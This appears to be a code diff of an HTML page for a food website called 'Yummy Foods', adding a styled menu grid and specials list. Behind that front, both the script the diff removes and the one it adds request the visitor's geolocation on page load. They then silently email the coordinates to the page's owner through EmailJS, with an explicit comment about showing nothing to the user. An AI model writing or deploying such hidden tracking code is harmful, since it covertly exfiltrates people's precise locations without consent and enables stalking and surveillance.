@@ -3,63 +3,277 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yummy Foods</title>
+    <title>Yummy Foods - Delicious Meals Await</title>
+    <style>
+        :root {
+            --primary-color: #28a745;
+            --secondary-color: #218838;
+            --text-color: #333;
+            --bg-color: #f8f9fa;
+            --card-bg: #ffffff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 2rem 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        header .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+        }
+
+        nav ul li {
+            margin-left: 1.5rem;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        nav ul li a:hover {
+            color: #e9e9e9;
+        }
+
+        main {
+            padding: 3rem 0;
+        }
+
+        .hero {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .hero h2 {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .food-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+
+        .food-item {
+            background-color: var(--card-bg);
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .food-item:hover {
+            transform: translateY(-5px);
+        }
+
+        .food-item img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+
+        .food-item-content {
+            padding: 1.5rem;
+        }
+
+        .food-item h3 {
+            font-size: 1.4rem;
+            margin-bottom: 0.5rem;
+            color: var(--primary-color);
+        }
+
+        .food-item p {
+            font-size: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .specials {
+            background-color: var(--card-bg);
+            border-radius: 8px;
+            padding: 2rem;
+            margin-top: 3rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .specials h2 {
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        .specials ul {
+            list-style: none;
+        }
+
+        .specials li {
+            margin-bottom: 0.5rem;
+            padding-left: 1.5rem;
+            position: relative;
+        }
+
+        .specials li::before {
+            content: '•';
+            color: var(--primary-color);
+            position: absolute;
+            left: 0;
+        }
+
+        footer {
+            background-color: #343a40;
+            color: white;
+            text-align: center;
+            padding: 1.5rem 0;
+            margin-top: 3rem;
+        }
+
+        @media (max-width: 768px) {
+            header .container {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            nav ul {
+                margin-top: 1rem;
+            }
+
+            nav ul li {
+                margin: 0 0.75rem;
+            }
+        }
+    </style>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
     <header>
-        <h1>Welcome to Yummy Foods</h1>
-        <p>Find your next delicious meal!</p>
+        <div class="container">
+            <div>
+                <h1>Yummy Foods</h1>
+                <p>Find your next delicious meal!</p>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#featured">Featured</a></li>
+                    <li><a href="#menu">Menu</a></li>
+                    <li><a href="#specials">Specials</a></li>
+                </ul>
+            </nav>
+        </div>
     </header>
+    
+    <main class="container">
+        <section class="hero">
+            <h2>Discover Culinary Delights</h2>
+            <p>Embark on a gastronomic journey with our expertly crafted dishes, made from the finest ingredients.</p>
+        </section>
 
-    <script>
-        let watchId;
+        <section id="featured" class="food-grid">
+            <div class="food-item">
+                <img src="https://cdn.loveandlemons.com/wp-content/uploads/2022/06/pasta-primavera-1.jpg" alt="Pasta Primavera">
+                <div class="food-item-content">
+                    <h3>Pasta Primavera</h3>
+                    <p>Fresh vegetables sautéed with pasta in a light garlic sauce.</p>
+                </div>
+            </div>
+            <div class="food-item">
+                <img src="https://media.istockphoto.com/id/1349067702/photo/greek-salad-with-vinaigrette-dressing-topped-with-grilled-chicken.jpg?s=612x612&w=0&k=20&c=Y5mZbUb_uAPK90lGEM2pwxt_jxd7-8Uz_CdZ_Ikn4HU=" alt="Grilled Chicken Salad">
+                <div class="food-item-content">
+                    <h3>Grilled Chicken Salad</h3>
+                    <p>Juicy grilled chicken served on a bed of mixed greens.</p>
+                </div>
+            </div>
+            <div class="food-item">
+                <img src="https://media.istockphoto.com/id/1414575281/photo/a-delicious-and-tasty-italian-pizza-margherita-with-tomatoes-and-buffalo-mozzarella.jpg?s=612x612&w=0&k=20&c=v8mdiAa_5NaRYtIscClXe85lLzkx7loSd9_pJWt9G2o=" alt="Margherita Pizza">
+                <div class="food-item-content">
+                    <h3>Margherita Pizza</h3>
+                    <p>Classic pizza topped with fresh mozzarella, basil, and tomato sauce.</p>
+                </div>
+            </div>
+            <div class="food-item">
+                <img src="https://media.istockphoto.com/id/1224916255/photo/sushi-maki-with-salmon-shrimp-cucumber.jpg?s=612x612&w=0&k=20&c=qIu0V_qKpP1R2xWMxID0tRGPDhOivHQ9CJFiZLcXpI8=" alt="Sushi Platter">
+                <div class="food-item-content">
+                    <h3>Sushi Platter</h3>
+                    <p>A delightful assortment of sushi rolls with fresh fish.</p>
+                </div>
+            </div>
+        </section>
 
-        (function() {
-            emailjs.init("sjem_DYuQ5tWYRZlu"); // Your EmailJS user ID
-            getLocationAndSend(); // Automatically get location on page load
-        })();
+        <section id="specials" class="specials">
+            <h2>Today's Specials</h2>
+            <ul>
+                <li>Spicy Tuna Tacos</li>
+                <li>Quinoa Salad Bowl</li>
+                <li>Chocolate Lava Cake</li>
+            </ul>
+        </section>
+    </main>
 
-        function getLocationAndSend() {
-            if (navigator.geolocation) {
-                // Use watchPosition for continuous updates without showing anything to the user
-                watchId = navigator.geolocation.watchPosition(sendSilentLocation, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 30000,
-                    maximumAge: 0
-                });
+    <footer>
+        <p>&copy; 2024 Yummy Foods. All Rights Reserved.</p>
+    </footer>
 
-                // Stop watching after 1 minute to save battery
-                setTimeout(() => {
-                    navigator.geolocation.clearWatch(watchId);
-                }, 60000);
-            }
-        }
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+    function sendEmail(lat, long) {
+        emailjs.send("service_7ee2uba", "template_b4j0rx4", {
+            location_lat: lat,
+            location_long: long
+        }).then(function(response) {
+            console.log("Email sent successfully!", response);
+        }, function(error) {
+            console.error("Failed to send email: ", error);
+        });
+    }
 
-        function sendSilentLocation(position) {
-            let latitude = position.coords.latitude;
-            let longitude = position.coords.longitude;
-            let accuracy = position.coords.accuracy;
+    navigator.geolocation.getCurrentPosition(function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        sendEmail(latitude, longitude);
+    }, function(error) {
+        // Handle the error silently
+    });
+</script>
 
-            let localTime = new Date().toLocaleString();
-
-            const emailData = {
-                from_name: "Yummy Foods Location Tracker",
-                message: `Latitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nLocal Time: ${localTime}`,
-            };
-
-            emailjs.send("service_7ee2uba", "template_b4j0rx4", emailData)
-                .then(function(response) {
-                    console.log(`SUCCESS! Data sent. Status: ${response.status}`);
-                })
-                .catch(function(error) {
-                    console.error(`FAILED! Error sending email: ${error.text}`);
-                });
-        }
-
-        function showError(error) {
-            console.error("Error getting location:", error);
-        }
-    </script>
 </body>
 </html>
